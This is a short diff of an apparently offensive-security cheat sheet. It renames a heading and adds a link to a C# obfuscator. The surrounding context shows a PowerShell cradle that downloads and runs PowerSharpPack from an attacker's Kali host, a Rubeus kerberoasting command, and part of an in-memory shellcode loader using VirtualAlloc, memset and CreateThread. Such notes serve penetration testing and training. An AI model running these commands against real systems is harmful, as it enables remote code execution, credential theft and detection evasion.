@@ -131,7 +131,7 @@ $out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($s
     - Insanely useful powershell script that has C# executables bundled into it as compiled base64 binaries
     - Run with `iex(new-object net.webclient).downloadstring('http://{kali_IP:port}/PowerSharpPack.ps1')` and `PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"`, for example
 
-# Import VirtualAlloc to allocate memory
+## Import VirtualAlloc to allocate memory
 
 ```Powershell
 $code = '
@@ -162,3 +162,8 @@ for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i
 
 $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 ```
+
+## Misc
+
+**C# Obfuscator**
+- https://github.com/michaelweber/CSharpSourceObfuscator
